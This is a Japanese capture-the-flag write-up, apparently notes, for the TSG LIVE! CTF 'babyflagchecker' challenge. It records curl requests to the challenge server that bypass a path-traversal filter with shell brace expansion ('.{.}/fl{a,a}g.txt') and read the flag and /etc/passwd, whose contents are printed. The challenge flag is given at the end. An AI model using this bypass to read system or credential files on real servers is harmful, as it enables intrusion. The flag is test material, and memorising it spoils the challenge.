# test

なんか{}で囲うとこういうパストラをバイパスできるんじゃなかったっけか

```bash
╭─ /Users/mionorn124/Downloads/TSG LIVE! CTF/Rev/babyflagchecker(pwn)
╰─ (*'-') < curl -G 'http://163.44.103.107:30004//file' --data-urlencode 'filename=.{.}/fl{a,a}g.txt'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET //file</pre>
</body>
</html>
╭─ /Users/mionorn124/Downloads/TSG LIVE! CTF/Rev/babyflagchecker(pwn)
╰─ (*'-') < curl -G 'http://163.44.103.107:30004//file' --data-urlencode 'filename=.{.}/.{.}/fl{a,a}g.txt'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET //file</pre>
</body>
</html>
╭─ /Users/mionorn124/Downloads/TSG LIVE! CTF/Rev/babyflagchecker(pwn)
╰─ (*'-') < curl -G 'http://163.44.103.107:30004//file' --data-urlencode 'filename=.{.}/.{.}/.{.}/fl{a,a}g.txt'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET //file</pre>
</body>
</html>
```

ここまで打ち間違えてるガバ

ここで//になってることに気がつく


```bash
curl -G 'http://163.44.103.107:30004/file' --data-urlencode 'filename=.{.}/fl{a,a}g.txt'



╭─ /Users/mionorn124/Downloads/TSG LIVE! CTF/Rev/babyflagchecker(pwn)
╰─ (*'-') < curl -G 'http://163.44.103.107:30004/file' --data-urlencode 'filename=.{.}/.{.}/fl{a,a}g.txt'
TSGLIVE{*** REDACTED ***}%                                                                                              ╭─ /Users/mionorn124/Downloads/TSG LIVE! CTF/Rev/babyflagchecker(pwn)
╰─ (*'-') < curl -G 'http://163.44.103.107:30004/file' --data-urlencode 'filename=.{.}/.{.}/.{.}/fl{a,a}g.txt'
TSGLIVE{*** REDACTED ***}%
```

検索する
```
zsh の行末の % は「出力が改行で終わっていない」という印です。flag ファイルの末尾に改行がないため、2つのコピーが TSGLIVE{…}TSGLIVE{…} と同じ行に並びます。.+ は貪欲マッチなので、2つまとめて1回で伏せられてしまいました。ただ、flag 自体は depth 2 で読めているので、場所は /flag.txt です。

対策として、2つの flag の間に「改行で終わる別のファイル」を挟みます。
```

/etc/passwdとか通してみるか

```bash
╭─ /Users/mionorn124/Downloads/TSG LIVE! CTF/Rev/babyflagchecker(pwn)
╰─ (*'-') < curl -G 'http://163.44.103.107:30004/file' --data-urlencode 'filename=.{.}/.{.}/{fl,etc/passwd#,fl}ag.txt'
TSGLIVE{*** REDACTED ***}root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
TSGLIVE{Wh1ch_sight5ee1ng_spo7_d0_you_like?}%                                                            
```

# flag
```
TSGLIVE{Wh1ch_sight5ee1ng_spo7_d0_you_like?}
```
